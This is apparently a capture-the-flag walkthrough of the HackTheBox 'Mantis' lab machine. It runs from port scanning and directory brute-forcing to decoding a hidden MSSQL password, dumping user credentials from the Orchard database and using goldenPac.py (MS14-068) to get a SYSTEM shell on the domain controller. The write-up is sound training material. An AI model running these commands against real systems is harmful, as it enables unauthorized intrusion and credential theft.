# Nmap:
```bash
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-04 01:01:08Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  0D�(#V       Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2023-07-04T01:02:13+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-07-04T00:47:51
|_Not valid after:  2053-07-04T00:47:51
| ms-sql-ntlm-info: 
|   10.10.10.52:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Tossed Salad - Blog
|_http-server-header: Microsoft-IIS/7.5
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
49168/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
|_ssl-date: 2023-07-04T01:02:13+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.10.52:50255: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-07-04T00:47:51
|_Not valid after:  2053-07-04T00:47:51
| ms-sql-info: 
|   10.10.10.52:50255: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 50255
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-04T01:02:06
|_  start_date: 2023-07-04T00:47:40
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2023-07-03T21:02:05-04:00
|_clock-skew: mean: 34m17s, deviation: 1h30m43s, median: 0s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

```

# Dirsearch on port 1337:
```bash
└─$ sudo ./dirsearch.py -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

Target: http://10.10.10.52:1337/

[04:20:54] Starting:                                                                                                                                                                                              
[04:28:03] 500 -    3KB - /orchard                                           
[04:48:34] 301 -  160B  - /secure_notes  ->  http://10.10.10.52:1337/secure_notes/
```

# Upon navigation to secure notes got:

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/435026cd-1d85-4264-8668-63f1f8696410)

# On opening the file:

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/448e2821-fce9-4142-8d18-9659ed020ee9)

# on looking at the file name got password:

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/0a40b8b6-e3e4-4e0f-baa2-c3b3a91a536d)

# on cracking got password:
```bash
└─$ echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d
6d2424716c5f53405f504073735730726421     

└─$ echo "6d2424716c5f53405f504073735730726421" | xxd -r -p
m$$ql_S@_P@ssW0rd!    
```

# Login to sql using sqsh:
```bash
└─$ mssqlclient.py -p 1433 admin:'m$$ql_S@_P@ssW0rd!'@10.10.10.52
SQL> SELECT * FROM master.sys.databases
name                                     

SQL> SELECT name FROM master.sys.databases
name                                                                                                                               
--------------------------------------------------------------------------------------------------------------------------------   
master                                                                                                                             
tempdb                                                                                                                             
model                                                                                                                              
msdb                                                                                                                               
orcharddb                        

SQL> use orcharddb
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: orcharddb
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'orcharddb'.

SQL> SELECT * FROM information_schema.tables;
TABLE_CATALOG                                                                                                                      TABLE_SCHEMA 
                                                            TABLE_NAME                                                                                                                         TABLE_TYPE   
--------------------------------------------------------------------------------------------------------------------------------  
														 --------------------------------------------------------------------------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   ----------   
orcharddb                                                                                                                          dbo                                                                                                                               
										blog_Orchard_Blogs_RecentBlogPostsPartRecord                                                                                       BASE TABLE   
orcharddb                                                                                                                          dbo                                                                                                                                		
										blog_Orchard_Blogs_BlogArchivesPartRecord                                                                                          BASE TABLE   

------------------snip----------------

 blog_Orchard_Users_UserPartRecord  (seems interesting)
 
SQL> select * from blog_Orchard_Users_UserPartRecord;

SQL> SELECT UserName,Email,Password from blog_Orchard_Users_UserPartRecord

James                                                                                                                                                                                                                                                             james@htb.local                                                                                                                                                                                                                                                   J@m3s_P@ssW0rd!      
```

# This yields the following user accounts:
```bash
admin:Password1234 
James:J@m3s_P@ssW0rd! 
```
# using the exploit ms14-068 got vulnrability:
```bash
└─$ goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 HTB.LOCAL/james:'J@m3s_P@ssW0rd!'@mantis.htb.local

C:\Windows\system32>whoami
nt authority\system

```
